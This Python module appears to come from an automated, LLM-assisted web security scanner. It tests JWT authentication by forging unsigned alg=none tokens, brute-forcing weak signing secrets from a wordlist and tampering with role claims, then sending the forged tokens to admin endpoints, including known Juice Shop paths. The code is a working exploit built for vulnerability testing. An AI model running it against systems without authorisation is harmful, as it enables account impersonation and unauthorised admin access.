"""
modules/broken_auth.py — Broken Authentication (OWASP A07)

What is Broken Authentication?
  Weaknesses in how an app handles tokens and sessions.
  Common examples:
  - JWT signed with "none" algorithm (no signature needed)
  - JWT using a weak/guessable secret key
  - JWT claims can be modified (e.g. role=user → role=admin)
  - OAuth redirect_uri not properly validated

How this module works:
  1. Auto-login to get a real JWT from the target
  2. LLM decodes and analyses the token
  3. Attack A: alg=none (forge token with no signature)
  4. Attack B: weak secret brute force (try common passwords)
  5. Attack C: privilege escalation (change role to admin)
  6. LLM gives a verdict on each attack
  7. Returns confirmed findings
"""

import json
import base64
import httpx
import asyncio
from llm import call_llm
from config import settings
from modules.auto_accounts import create_two_accounts, login_one_account


# Common weak secrets to brute force
WEAK_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin",
    "letmein", "welcome", "jwt_secret", "your-256-bit-secret",
    "supersecret", "mysecret", "key", "private", "token",
    "auth", "secret123", "password123", "changeme", "default",
    "test", "app_secret", "jwt", "secure", "hack",
]

# Common admin endpoint patterns to test privilege escalation
ADMIN_PATHS = [
    "/api/admin",
    "/api/admin/users",
    "/administration",
    "/rest/admin",
    "/api/v1/admin",
    "/admin",
]


async def run_broken_auth(
    recon_data: dict,
    target_url: str,
    user_email: str = "",
    user_password: str = "",
) -> list[dict]:
    """
    Main broken auth detection function.
    Fully autonomous — logs in, gets JWT, tests all attacks.

    Returns list of confirmed findings.
    """
    findings = []

    # Step 1 — Get a JWT token to analyse
    # If user provided credentials use them, otherwise auto-create account
    token, user_id = "", ""

    if user_email and user_password:
        print(f"BROKEN-AUTH: Using provided credentials ({user_email})...")
        token, user_id = await login_one_account(
            target_url, user_email, user_password
        )
    else:
        print("BROKEN-AUTH: Auto-creating test account to get JWT...")
        accounts = await create_two_accounts(target_url, recon_data)
        if accounts["success"]:
            token   = accounts["token_a"]
            user_id = accounts["user_a_id"]
            user_email = accounts["user_a_email"]
        else:
            # Return help message as finding
            return [{
                "vulnerability": "Broken Auth — Setup Failed",
                "owasp":         "A07:2025 — Identification and Authentication Failures",
                "endpoint":      target_url,
                "severity":      "info",
                "needs_help":    True,
                "error":         accounts["error"],
                "help_message":  accounts["help_message"],
                "evidence":      {},
                "ai_reasoning":  accounts["error"],
            }]

    if not token:
        return [{
            "vulnerability": "Broken Auth — Could Not Obtain JWT",
            "owasp":         "A07:2025 — Identification and Authentication Failures",
            "endpoint":      target_url,
            "severity":      "info",
            "needs_help":    True,
            "error":         "Could not obtain a JWT token from login",
            "help_message":  (
                "Could not log in to get a JWT token. "
                "Please provide valid credentials to test authentication."
            ),
            "evidence":      {},
            "ai_reasoning":  "No JWT obtained — cannot test authentication vulnerabilities",
        }]

    print(f"BROKEN-AUTH: Got JWT token. Analysing...")

    # Step 2 — Decode the token and get LLM analysis
    decoded  = _decode_jwt(token)
    analysis = _llm_analyse_token(decoded, token)
    print(f"BROKEN-AUTH: Token algorithm: {decoded.get('header', {}).get('alg', 'unknown')}")

    # Step 3 — Run all attacks
    async with httpx.AsyncClient(
        timeout=settings.request_timeout,
        follow_redirects=True,
        verify=False,
    ) as client:

        # Attack A — alg:none
        print("BROKEN-AUTH: Testing alg=none attack...")
        finding_a = await _test_alg_none(
            client, target_url, decoded, recon_data
        )
        if finding_a:
            findings.append(finding_a)
            print("BROKEN-AUTH: ⚠️  alg=none VULNERABLE")
        else:
            print("BROKEN-AUTH: ✓ alg=none protected")

        # Attack B — weak secret
        print("BROKEN-AUTH: Testing weak secret brute force...")
        finding_b = await _test_weak_secret(
            client, target_url, token, decoded, recon_data
        )
        if finding_b:
            findings.append(finding_b)
            print(f"BROKEN-AUTH: ⚠️  Weak secret found: {finding_b['cracked_secret']}")
        else:
            print("BROKEN-AUTH: ✓ Secret appears strong")

        # Attack C — privilege escalation
        print("BROKEN-AUTH: Testing privilege escalation...")
        finding_c = await _test_privilege_escalation(
            client, target_url, token, decoded, recon_data
        )
        if finding_c:
            findings.append(finding_c)
            print("BROKEN-AUTH: ⚠️  Privilege escalation VULNERABLE")
        else:
            print("BROKEN-AUTH: ✓ Privilege escalation protected")

    return findings


# ── JWT helpers ───────────────────────────────────────────────────

def _decode_jwt(token: str) -> dict:
    """
    Decode a JWT without verifying the signature.
    Returns dict with header and payload.
    """
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {"raw": token, "header": {}, "payload": {}}

        def _b64_decode(s: str) -> dict:
            # Add padding if needed
            s += "=" * (4 - len(s) % 4)
            try:
                return json.loads(base64.urlsafe_b64decode(s))
            except Exception:
                return {}

        return {
            "raw":     token,
            "header":  _b64_decode(parts[0]),
            "payload": _b64_decode(parts[1]),
            "parts":   parts,
        }
    except Exception:
        return {"raw": token, "header": {}, "payload": {}}


def _llm_analyse_token(decoded: dict, raw_token: str) -> dict:
    """Ask LLM to analyse the JWT and suggest attacks."""
    prompt = f"""You are a security analyst examining a JWT token.

Header:  {json.dumps(decoded.get('header', {}))}
Payload: {json.dumps(decoded.get('payload', {}))}

Analyse this token:
1. What algorithm is used? Is it weak?
2. What claims are in the payload? Are any sensitive (role, admin, is_admin)?
3. What attacks should be tried?

Return ONLY JSON:
{{
  "algorithm": "HS256",
  "has_role_claim": true or false,
  "role_field": "role" or null,
  "current_role": "user" or null,
  "is_weak_alg": true or false,
  "recommended_attacks": ["alg_none", "weak_secret", "role_escalation"],
  "notes": "one line observation"
}}"""

    try:
        raw = call_llm(prompt, expect_json=True)
        return json.loads(raw)
    except Exception:
        return {
            "algorithm": decoded.get("header", {}).get("alg", "unknown"),
            "has_role_claim": False,
            "role_field": None,
            "current_role": None,
            "is_weak_alg": False,
            "recommended_attacks": ["alg_none", "weak_secret"],
            "notes": "LLM analysis failed"
        }


def _forge_token(header: dict, payload: dict, signature: str = "") -> str:
    """
    Forge a JWT with custom header and payload.
    Used for alg:none and role escalation attacks.
    """
    def _b64_encode(obj: dict) -> str:
        return base64.urlsafe_b64encode(
            json.dumps(obj, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    h = _b64_encode(header)
    p = _b64_encode(payload)
    return f"{h}.{p}.{signature}"


# ── Attack A: alg=none ────────────────────────────────────────────

async def _test_alg_none(
    client: httpx.AsyncClient,
    base_url: str,
    decoded: dict,
    recon_data: dict,
) -> dict | None:
    """
    Forge a JWT with algorithm=none and no signature.
    If the server accepts it, the vulnerability is confirmed.
    """
    payload = decoded.get("payload", {})
    if not payload:
        return None

    # Try all none variants — some servers only check exact case
    none_variants = ["none", "None", "NONE", "nOnE"]

    for alg_variant in none_variants:
        forged = _forge_token(
            header={"alg": alg_variant, "typ": "JWT"},
            payload=payload,
            signature=""
        )

        # Test against protected endpoints
        for path in _get_protected_paths(recon_data, base_url):
            try:
                r = await client.get(
                    path,
                    headers={"Authorization": f"Bearer {forged}"}
                )

                if r.status_code == 200 and len(r.text) > 20:
                    # Ask LLM if this looks like real protected data
                    verdict = _llm_verdict_alg_none(
                        path, r.status_code, r.text[:500], alg_variant
                    )
                    if verdict["vulnerable"]:
                        return {
                            "vulnerability": "Broken Auth — JWT Algorithm None Attack",
                            "owasp":  "A07:2025 — Identification and Authentication Failures",
                            "endpoint":  path,
                            "severity":  "critical",
                            "needs_help": False,
                            "evidence": {
                                "attack":  "alg=none",
                                "forged_header": {"alg": alg_variant, "typ": "JWT"},
                                "request":  {"url": path, "Authorization": f"Bearer {forged[:60]}..."},
                                "response": {"status": r.status_code, "body": r.text[:300]}
                            },
                            "ai_reasoning": verdict["reasoning"],
                        }
            except Exception:
                continue

    return None


def _llm_verdict_alg_none(
    endpoint: str, status: int, body: str, alg_used: str
) -> dict:
    """Ask LLM if alg=none attack succeeded."""
    prompt = f"""I sent a JWT with algorithm="{alg_used}" (no signature) to {endpoint}.
Response: HTTP {status}
Body: {body}

Did the server accept the unsigned token and return protected data?
Look for: user data, API responses, any non-error content.

Return ONLY JSON:
{{
  "vulnerable": true or false,
  "reasoning": "one sentence"
}}"""
    try:
        raw = call_llm(prompt, expect_json=True)
        return json.loads(raw)
    except Exception:
        return {"vulnerable": False, "reasoning": "LLM analysis failed"}


# ── Attack B: weak secret ─────────────────────────────────────────

async def _test_weak_secret(
    client: httpx.AsyncClient,
    base_url: str,
    original_token: str,
    decoded: dict,
    recon_data: dict,
) -> dict | None:
    """
    Try to crack the JWT signing secret using a common wordlist.
    If cracked, forge an admin token and test it.
    """
    alg = decoded.get("header", {}).get("alg", "HS256")

    # Only applies to HMAC algorithms
    if not alg.startswith("HS"):
        return None

    cracked_secret = None

    try:
        import hmac
        import hashlib

        parts = decoded.get("parts", [])
        if len(parts) != 3:
            return None

        message  = f"{parts[0]}.{parts[1]}".encode()
        orig_sig = parts[2]

        # Add padding to signature for base64 decoding
        orig_sig_padded = orig_sig + "=" * (4 - len(orig_sig) % 4)
        try:
            expected_sig = base64.urlsafe_b64decode(orig_sig_padded)
        except Exception:
            return None

        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg, hashlib.sha256)

        print(f"BROKEN-AUTH: Trying {len(WEAK_SECRETS)} common secrets...")
        for secret in WEAK_SECRETS:
            sig = hmac.new(
                secret.encode(), message, hash_func
            ).digest()
            if sig == expected_sig:
                cracked_secret = secret
                print(f"BROKEN-AUTH: Secret cracked! → '{secret}'")
                break

    except Exception as e:
        print(f"BROKEN-AUTH: Secret brute force error: {e}")
        return None

    if not cracked_secret:
        return None

    # Cracked! Now forge an admin token
    payload = dict(decoded.get("payload", {}))
    header  = decoded.get("header", {})

    # Elevate role in payload
    for field in ["role", "roles", "is_admin", "admin", "type"]:
        if field in payload:
            if field == "is_admin":
                payload[field] = True
            elif field == "roles":
                payload[field] = ["admin"]
            else:
                payload[field] = "admin"

    # Sign the forged token with the cracked secret
    try:
        import hmac, hashlib
        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg, hashlib.sha256)

        def _b64e(obj):
            return base64.urlsafe_b64encode(
                json.dumps(obj, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()

        h_enc = _b64e(header)
        p_enc = _b64e(payload)
        msg   = f"{h_enc}.{p_enc}".encode()
        sig   = base64.urlsafe_b64encode(
            hmac.new(cracked_secret.encode(), msg, hash_func).digest()
        ).rstrip(b"=").decode()

        forged_token = f"{h_enc}.{p_enc}.{sig}"

        # Test the forged admin token
        for path in ADMIN_PATHS:
            try:
                r = await client.get(
                    base_url + path,
                    headers={"Authorization": f"Bearer {forged_token}"}
                )
                if r.status_code == 200:
                    return {
                        "vulnerability": "Broken Auth — Weak JWT Secret",
                        "owasp":   "A07:2025 — Identification and Authentication Failures",
                        "endpoint": base_url + path,
                        "severity": "critical",
                        "cracked_secret": cracked_secret,
                        "needs_help": False,
                        "evidence": {
                            "attack":         "weak_secret_brute_force",
                            "cracked_secret": cracked_secret,
                            "algorithm":      alg,
                            "forged_payload": payload,
                            "admin_endpoint": base_url + path,
                            "response_status": r.status_code,
                        },
                        "ai_reasoning": (
                            f"JWT signing secret is '{cracked_secret}'. "
                            f"Forged admin token accepted at {path}. "
                            "Attacker can impersonate any user including admins."
                        )
                    }
            except Exception:
                continue

        # Even if no admin endpoint found, weak secret alone is critical
        return {
            "vulnerability": "Broken Auth — Weak JWT Secret",
            "owasp":   "A07:2025 — Identification and Authentication Failures",
            "endpoint": base_url,
            "severity": "critical",
            "cracked_secret": cracked_secret,
            "needs_help": False,
            "evidence": {
                "attack":         "weak_secret_brute_force",
                "cracked_secret": cracked_secret,
                "algorithm":      alg,
                "note":           "Secret cracked but no admin endpoint found to demonstrate impact",
            },
            "ai_reasoning": (
                f"JWT signing secret '{cracked_secret}' was cracked via wordlist. "
                "Attacker can forge tokens for any user account."
            )
        }

    except Exception as e:
        print(f"BROKEN-AUTH: Forging with cracked secret failed: {e}")

    return None


# ── Attack C: privilege escalation ───────────────────────────────

async def _test_privilege_escalation(
    client: httpx.AsyncClient,
    base_url: str,
    original_token: str,
    decoded: dict,
    recon_data: dict,
) -> dict | None:
    """
    Modify the JWT payload to escalate privileges (role=admin)
    and test if the server accepts the modified token without
    verifying the signature.
    """
    payload = dict(decoded.get("payload", {}))
    header  = dict(decoded.get("header", {}))

    # Find role-related claims
    role_fields = {
        k: v for k, v in payload.items()
        if any(word in k.lower() for word in ["role", "admin", "perm", "scope", "type"])
    }

    if not role_fields:
        return None   # No role claims to escalate

    # Modify payload — escalate all role fields
    modified_payload = dict(payload)
    for field, value in role_fields.items():
        if isinstance(value, bool):
            modified_payload[field] = True
        elif isinstance(value, list):
            modified_payload[field] = value + ["admin"]
        else:
            modified_payload[field] = "admin"

    # Forge token keeping original signature (tampered)
    # A server that doesn't verify signatures will accept this
    parts = decoded.get("parts", [])
    if len(parts) != 3:
        return None

    def _b64e(obj):
        return base64.urlsafe_b64encode(
            json.dumps(obj, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()

    h_enc      = parts[0]                     # Keep original header
    p_enc      = _b64e(modified_payload)      # Modified payload
    orig_sig   = parts[2]                     # Keep original signature (invalid)
    forged     = f"{h_enc}.{p_enc}.{orig_sig}"

    # Test against admin endpoints
    for path in ADMIN_PATHS:
        try:
            r = await client.get(
                base_url + path,
                headers={"Authorization": f"Bearer {forged}"}
            )
            if r.status_code == 200 and len(r.text) > 20:
                verdict = _llm_verdict_escalation(
                    path, r.status_code, r.text[:400],
                    role_fields, modified_payload
                )
                if verdict["vulnerable"]:
                    return {
                        "vulnerability": "Broken Auth — JWT Privilege Escalation",
                        "owasp":   "A07:2025 — Identification and Authentication Failures",
                        "endpoint": base_url + path,
                        "severity": "critical",
                        "needs_help": False,
                        "evidence": {
                            "attack":          "jwt_privilege_escalation",
                            "original_claims": role_fields,
                            "modified_claims": {k: modified_payload[k] for k in role_fields},
                            "forged_token":    forged[:80] + "...",
                            "response_status": r.status_code,
                            "response_body":   r.text[:300],
                        },
                        "ai_reasoning": verdict["reasoning"],
                    }
        except Exception:
            continue

    return None


def _llm_verdict_escalation(
    endpoint: str, status: int, body: str,
    original_claims: dict, modified_claims: dict
) -> dict:
    """Ask LLM if privilege escalation worked."""
    prompt = f"""I modified a JWT payload to escalate privileges:
Original claims: {original_claims}
Modified to admin role, sent to: {endpoint}
Response: HTTP {status}
Body: {body}

Did the server accept the tampered token and return admin data?

Return ONLY JSON:
{{
  "vulnerable": true or false,
  "reasoning": "one sentence"
}}"""
    try:
        raw = call_llm(prompt, expect_json=True)
        return json.loads(raw)
    except Exception:
        return {"vulnerable": False, "reasoning": "LLM analysis failed"}


# ── Utilities ─────────────────────────────────────────────────────

def _get_protected_paths(recon_data: dict, base_url: str) -> list[str]:
    """
    Get a list of endpoints to test alg=none against.
    Puts the most reliably protected endpoints FIRST so we always
    get a result even if recon-discovered paths return 401.
    """
    paths = []

    # ── Priority 1: known endpoints that return real data ─────────
    # These are tested first — if alg=none works, we find it quickly
    priority = [
        "/api/Users",           # Juice Shop — returns all users (admin data)
        "/api/Users/1",         # Juice Shop — admin profile
        "/api/users",           # generic
        "/rest/user/whoami",    # Juice Shop — current user profile
        "/api/admin",
        "/api/admin/users",
    ]
    for path in priority:
        paths.append(base_url + path)

    # ── Priority 2: recon-discovered endpoints ─────────────────────
    for endpoint in recon_data.get("alive_endpoints", []):
        lower = endpoint.lower()
        if any(word in lower for word in ["/api/user", "/api/admin", "/profile"]):
            if endpoint not in paths:
                paths.append(endpoint)

    # ── Priority 3: more generic fallbacks ───────────────────────
    more = [
        "/api/user/1",
        "/api/me",
        "/api/profile",
        "/api/v1/users",
        "/api/v2/users",
    ]
    for path in more:
        full = base_url + path
        if full not in paths:
            paths.append(full)

    # Deduplicate, preserve order
    seen   = set()
    result = []
    for p in paths:
        if p not in seen:
            seen.add(p)
            result.append(p)

    return result[:12]
